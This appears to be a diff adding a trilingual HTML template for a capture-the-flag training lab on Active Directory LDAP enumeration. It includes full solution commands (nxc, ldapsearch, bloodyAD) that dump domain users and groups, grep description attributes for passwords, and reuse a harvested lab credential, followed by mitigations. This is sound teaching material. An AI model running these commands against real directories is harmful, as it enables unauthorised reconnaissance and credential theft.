@@ -1,0 +1,211 @@
+{% extends "base.html" %}
+{% block title %}AD02 – LDAP Enumeration – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2" style="color:var(--hl-primary)" data-i18n="obj_title">Objetivo</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="ad_ldap_enum_obj_desc">Con la cuenta de servicio svc.readonly obtenida en AD01, enumera los usuarios del dominio (la enumeración anónima no funciona contra este DC) y vuelca los objetos del directorio por LDAP. El servidor permite binds simples sin cifrado y un administrador dejó escrita una contraseña —y la flag— en el atributo description de un usuario.</p>
+    <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="obj_flag_lbl">Flag:</strong> <code>LDAP · atributo description</code> <span data-i18n="ad_obj_flag_where">— captúrala en el Domain Controller y valídala en la caja «Validar Flag» al final de esta página.</span></p>
+  </div>
+
+  {% include 'labs/_ad_target.html' %}
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-3" data-i18n="ad_quickstart">Inicio rápido</h2>
+    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Enumerar usuarios del dominio con la credencial de AD01
+nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --users
+
+# Volcar descripciones de todos los usuarios por LDAP (bloodyAD, no nxc ldap)
+bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' get search --filter '(description=*)' --attr sAMAccountName,description</pre>
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>1 · Descubrir el contexto del directorio</h3>
+    <p>El <em>RootDSE</em> se consulta sin autenticación y revela el naming context del dominio.</p>
+    <pre>ldapsearch -x -H ldap://{{ ad_dc_ip }} -s base namingcontexts
+# namingContexts: DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}
+
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -s base '(objectClass=*)' | head -40</pre>
+
+    <h3>2 · Enumerar usuarios con la credencial de AD01</h3>
+    <p>La enumeración anónima de usuarios (RID cycling con sesión nula o <code>guest</code>) no funciona contra este Domain Controller. Con la credencial <code>svc.readonly</code> obtenida en AD01, SAMR sí responde con normalidad — es una sesión autenticada, no anónima.</p>
+    <pre>nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --users</pre>
+    <p>Devuelve los 15 usuarios del dominio junto con su descripción — incluida la de <code>t.rodriguez</code>, que usarás en el paso 4.</p>
+
+    <h3>3 · Bind autenticado con la cuenta de servicio</h3>
+    <p>El servidor tiene <code>ldap server require strong auth = no</code>, así que acepta binds simples en texto claro.</p>
+    <pre>ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" '(objectClass=user)' sAMAccountName | grep sAMAccountName</pre>
+
+    <p><strong>Nota sobre este Domain Controller:</strong> <code>nxc ldap</code>, <code>ldapdomaindump</code> y <code>windapsearch</code> usan un bind NTLM (<code>ldap3</code>/impacket Sicily) que el servidor Samba corta a media negociación (<code>LDAPSessionTerminatedByServerError</code> / <code>IndexError: list index out of range</code>) — <strong>fallan incluso solo para autenticar</strong>, no es un problema de un módulo concreto. El bind LDAP <strong>simple</strong> (<code>ldapsearch -x -D ...</code>, usuario+contraseña en claro) sí funciona siempre; <code>bloodyAD</code> también funciona porque usa su propia librería (<code>badldap</code>), no <code>ldap3</code>.</p>
+
+    <h3>4 · Volcar usuarios, grupos y equipos</h3>
+    <pre># Usuarios (sin cuentas de máquina)
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" '(&(objectCategory=person)(objectClass=user))' \
+  sAMAccountName description memberOf userAccountControl
+
+# Grupos y sus miembros
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" '(objectClass=group)' sAMAccountName member
+
+# Lo mismo con bloodyAD (alternativa que sí funciona contra este DC)
+bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' get search --filter '(objectClass=group)' --attr sAMAccountName</pre>
+
+    <h3>5 · Buscar credenciales en los atributos</h3>
+    <p>El atributo <code>description</code> es legible por cualquier usuario autenticado y es donde más credenciales se filtran en dominios reales.</p>
+    <pre># Con bloodyAD
+bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' get search --filter '(description=*)' --attr sAMAccountName,description
+
+# A mano, filtrando por palabras clave
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" '(description=*)' sAMAccountName description \
+  | grep -iE 'pass|pwd|HL\{'</pre>
+    <p>El usuario <code>t.rodriguez</code> devuelve:</p>
+    <pre>sAMAccountName: t.rodriguez
+description: Cuenta temporal creada por Helpdesk. Password inicial: Welcome2024! - HL{···}</pre>
+
+    <h3>6 · Capturar la flag</h3>
+    <pre>HL{···}</pre>
+    <p>Además te llevas una credencial válida más: <code>t.rodriguez / Welcome2024!</code>.</p>
+    <pre>nxc smb {{ ad_dc_ip }} -u 't.rodriguez' -p 'Welcome2024!'</pre>
+
+    <h3>Mitigación</h3>
+    <ul>
+      <li>Prohibir credenciales en <code>description</code>, <code>info</code> o <code>comment</code>; auditarlos periódicamente.</li>
+      <li>Exigir LDAP firmado y sellado (<code>ldap server require strong auth = yes</code>, LDAPS obligatorio).</li>
+      <li>Limitar los atributos legibles por usuarios autenticados y monitorizar consultas LDAP masivas.</li>
+    </ul>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">ldapsearch</span> <span class="tools-badge">bloodyAD</span> <span class="tools-badge">netexec (nxc) — solo SMB</span></div>
+  </div>
+
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>1 · Discover the directory context</h3>
+    <p>The <em>RootDSE</em> answers without authentication and reveals the domain naming context.</p>
+    <pre>ldapsearch -x -H ldap://{{ ad_dc_ip }} -s base namingcontexts
+# namingContexts: DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}
+
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -s base '(objectClass=*)' | head -40</pre>
+
+    <h3>2 · Enumerate users with the AD01 credential</h3>
+    <p>Anonymous user enumeration (RID cycling with a null or <code>guest</code> session) does not work against this Domain Controller. With the <code>svc.readonly</code> credential from AD01, SAMR responds normally — this is an authenticated session, not an anonymous one.</p>
+    <pre>nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --users</pre>
+    <p>Returns all 15 domain users along with their description — including <code>t.rodriguez</code>'s, which you'll use in step 5.</p>
+
+    <h3>3 · Authenticated bind with the service account</h3>
+    <p>The server runs <code>ldap server require strong auth = no</code>, so it accepts cleartext simple binds.</p>
+    <pre>ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" '(objectClass=user)' sAMAccountName | grep sAMAccountName</pre>
+
+    <p><strong>Note about this Domain Controller:</strong> <code>nxc ldap</code>, <code>ldapdomaindump</code> and <code>windapsearch</code> use an NTLM bind (<code>ldap3</code>/impacket Sicily) that the Samba server cuts off mid-negotiation (<code>LDAPSessionTerminatedByServerError</code> / <code>IndexError: list index out of range</code>) — they fail just to authenticate, it's not a single-module problem. A <strong>simple</strong> LDAP bind (<code>ldapsearch -x -D ...</code>, plaintext user+password) always works; <code>bloodyAD</code> also works because it uses its own library (<code>badldap</code>), not <code>ldap3</code>.</p>
+
+    <h3>4 · Dump users, groups and computers</h3>
+    <pre># Users (machine accounts excluded)
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" '(&(objectCategory=person)(objectClass=user))' \
+  sAMAccountName description memberOf userAccountControl
+
+# Groups and their members
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" '(objectClass=group)' sAMAccountName member
+
+# Same thing with bloodyAD (alternative that does work against this DC)
+bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' get search --filter '(objectClass=group)' --attr sAMAccountName</pre>
+
+    <h3>5 · Hunt for credentials in the attributes</h3>
+    <p>The <code>description</code> attribute is readable by any authenticated user and is where most credentials leak in real domains.</p>
+    <pre># With bloodyAD
+bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' get search --filter '(description=*)' --attr sAMAccountName,description
+
+# By hand, filtering on keywords
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" '(description=*)' sAMAccountName description \
+  | grep -iE 'pass|pwd|HL\{'</pre>
+    <p>User <code>t.rodriguez</code> returns:</p>
+    <pre>sAMAccountName: t.rodriguez
+description: Cuenta temporal creada por Helpdesk. Password inicial: Welcome2024! - HL{···}</pre>
+
+    <h3>6 · Capture the flag</h3>
+    <pre>HL{···}</pre>
+    <p>You also walk away with one more valid credential: <code>t.rodriguez / Welcome2024!</code>.</p>
+    <pre>nxc smb {{ ad_dc_ip }} -u 't.rodriguez' -p 'Welcome2024!'</pre>
+
+    <h3>Mitigation</h3>
+    <ul>
+      <li>Ban credentials in <code>description</code>, <code>info</code> or <code>comment</code>; audit them regularly.</li>
+      <li>Require LDAP signing and sealing (<code>ldap server require strong auth = yes</code>, LDAPS only).</li>
+      <li>Restrict which attributes authenticated users can read and monitor bulk LDAP queries.</li>
+    </ul>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">ldapsearch</span> <span class="tools-badge">bloodyAD</span> <span class="tools-badge">netexec (nxc) — SMB only</span></div>
+  </div>
+  <div class="lang-content" data-lang="pt" style="display:none">
+    <h3>1 · Descobrir o contexto do diretório</h3>
+    <p>O <em>RootDSE</em> responde sem autenticação e revela o contexto de nomenclatura do domínio.</p>
+    <pre>ldapsearch -x -H ldap://{{ ad_dc_ip }} -s base namingcontexts
+# namingContexts: DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}
+
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -s base '(objectClass=*)' | head -40</pre>
+
+    <h3>2 · Enumerar usuários com a credencial do AD01</h3>
+    <p>A enumeração anônima de usuários (cycling de RID com sessão nula ou <code>guest</code>) não funciona contra este Domain Controller. Com a credencial <code>svc.readonly</code> do AD01, o SAMR responde normalmente — esta é uma sessão autenticada, e não anônima.</p>
+    <pre>nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --users</pre>
+    <p>Retorna todos os 15 usuários do domínio juntamente com suas descrições — incluindo a de <code>t.rodriguez</code>, que você usará no passo 5.</p>
+
+    <h3>3 · Bind autenticado com a conta de serviço</h3>
+    <p>O servidor executa com <code>ldap server require strong auth = no</code>, portanto aceita binds simples em texto claro.</p>
+    <pre>ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" '(objectClass=user)' sAMAccountName | grep sAMAccountName</pre>
+
+    <p><strong>Nota sobre este Domain Controller:</strong> <code>nxc ldap</code>, <code>ldapdomaindump</code> e <code>windapsearch</code> utilizam bind NTLM (<code>ldap3</code>/impacket Sicily) que o servidor Samba encerra no meio da negociação (<code>LDAPSessionTerminatedByServerError</code> / <code>IndexError: list index out of range</code>) — eles falham logo na autenticação, não sendo um problema de um único módulo. Um bind LDAP <strong>simples</strong> (<code>ldapsearch -x -D ...</code>, usuário e senha em texto claro) sempre funciona; o <code>bloodyAD</code> também funciona porque utiliza sua própria biblioteca (<code>badldap</code>), e não o <code>ldap3</code>.</p>
+
+    <h3>4 · Extrair usuários, grupos e computadores</h3>
+    <pre># Users (machine accounts excluded)
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" '(&(objectCategory=person)(objectClass=user))' \
+  sAMAccountName description memberOf userAccountControl
+
+# Groups and their members
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" '(objectClass=group)' sAMAccountName member
+
+# Same thing with bloodyAD (alternative that does work against this DC)
+bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' get search --filter '(objectClass=group)' --attr sAMAccountName</pre>
+
+    <h3>5 · Buscar credenciais nos atributos</h3>
+    <p>O atributo <code>description</code> é legível por qualquer usuário autenticado e é onde muitas credenciais vazam em domínios reais.</p>
+    <pre># With bloodyAD
+bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' get search --filter '(description=*)' --attr sAMAccountName,description
+
+# By hand, filtering on keywords
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" '(description=*)' sAMAccountName description \
+  | grep -iE 'pass|pwd|HL\{'</pre>
+    <p>O usuário <code>t.rodriguez</code> retorna:</p>
+    <pre>sAMAccountName: t.rodriguez
+description: Cuenta temporal creada por Helpdesk. Password inicial: Welcome2024! - HL{···}</pre>
+
+    <h3>6 · Capturar a flag</h3>
+    <pre>HL{···}</pre>
+    <p>Você também obtém mais uma credencial válida: <code>t.rodriguez / Welcome2024!</code>.</p>
+    <pre>nxc smb {{ ad_dc_ip }} -u 't.rodriguez' -p 'Welcome2024!'</pre>
+
+    <h3>Mitigação</h3>
+    <ul>
+      <li>Proibir credenciais em <code>description</code>, <code>info</code> ou <code>comment</code>; auditá-los regularmente.</li>
+      <li>Exigir assinatura e selamento no LDAP (<code>ldap server require strong auth = yes</code>, apenas LDAPS).</li>
+      <li>Restringir quais atributos usuários autenticados podem ler e monitorar consultas LDAP em massa.</li>
+    </ul>
+
+    <h3>Ferramentas</h3>
+    <div><span class="tools-badge">ldapsearch</span> <span class="tools-badge">bloodyAD</span> <span class="tools-badge">netexec (nxc) — apenas SMB</span></div>
+  </div>
+</div>
+{% endblock %}
